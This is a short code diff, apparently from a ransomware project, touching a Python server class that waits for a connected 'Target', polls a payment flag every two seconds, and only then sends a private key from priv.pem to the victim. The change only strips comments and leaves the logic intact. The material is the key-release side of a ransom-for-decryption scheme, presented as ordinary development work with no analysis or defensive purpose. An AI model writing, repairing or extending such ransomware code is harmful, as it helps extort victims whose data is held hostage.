@@ -29,11 +29,9 @@ class Server:
             data = conn.recv(2048)
             print("Target connected:", data.decode(), addr[0])
             
-            # Poll until payment is received
             while not globals.get_payment():
-                time.sleep(2)  # check every 2 seconds, don't hammer the CPU
+                time.sleep(2)  
             
-            # Payment confirmed, send the key
             self.send_key(conn)
             
         except Exception as e:
@@ -46,7 +44,7 @@ class Server:
         if globals.get_payment():
             self.send_key(conn)
 
-    def send_key(self, conn):  # needs conn param
+    def send_key(self, conn): 
         with open("priv.pem", "r") as f:
             key = f.read()
         conn.send(key.encode())
